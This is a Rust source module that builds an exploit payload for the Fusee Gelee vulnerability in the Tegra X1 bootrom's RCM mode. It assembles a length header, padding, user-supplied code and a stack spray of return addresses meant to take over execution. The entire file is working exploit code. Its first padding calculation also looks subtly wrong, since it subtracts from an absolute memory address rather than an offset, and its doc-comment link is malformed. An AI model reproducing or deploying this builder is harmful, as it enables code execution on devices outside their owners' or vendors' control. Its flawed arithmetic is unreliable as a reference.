//! `Fusee` builds a payload which can be used to exploit a vulnerable
//! Tegra X1 using the [Fusee Gelee exploit](https;//github.com/Qyriad/fusee-launcher].
//!
//! A payload has the following structure:
//! 1. RCM command that includes the maximum length, ensuring that we can
//! send as much as possible.
//! 2. The stack spray  to override the return address.
//! 3. The program which should be executed.
//! 4. The payload is padded to be evenly divisible by the 0x1000 block size.

use bytes::{BufMut, Bytes, BytesMut};

const LENGTH: u32 = 0x30298;

// The address where the RCM payload is placed.
// This is fixed for most device.
const RCM_PAYLOAD_ADDR: u32 = 0x40010000;

// The address where the user payload is expected to begin.
const PAYLOAD_START_ADDR: u32 = 0x40010E40;

// Specify the range of addresses where we should inject the
// payload address.
const STACK_SPRAY_START: u32 = 0x40014E40;
const STACK_SPRAY_END: u32 = 0x40017000;

/// Builds the payload that executes the given code using the Fusee
/// Gelee exploit.
pub fn build_payload(code: Bytes) -> Bytes {
    let mut payload = BytesMut::new();

    insert_length(&mut payload);
    let len = payload.len();
    insert_padding(&mut payload, PAYLOAD_START_ADDR as usize - len);
    insert_code(&mut payload, code);
    let len = payload.len();
    insert_padding(&mut payload, 0x1000 - (len % 0x1000));

    payload.freeze()
}

fn insert_padding(payload: &mut BytesMut, len: usize) {
    let padding = b"\0".repeat(len);
    payload.put_slice(padding.as_slice());
}

fn insert_length(payload: &mut BytesMut) {
    payload.put_u32_le(LENGTH);
}

fn insert_code(payload: &mut BytesMut, code: Bytes) {
    let mut first_part = code;
    let second_part = first_part.split_off((STACK_SPRAY_START - PAYLOAD_START_ADDR) as usize);
    payload.put(first_part);
    insert_stack_spray(payload);
    payload.put(second_part);
}

fn insert_stack_spray(payload: &mut BytesMut) {
    let count = ((STACK_SPRAY_END - STACK_SPRAY_START) / 4) as u32;
    for _ in 0..count {
        payload.put_u32_le(RCM_PAYLOAD_ADDR);
    }
}
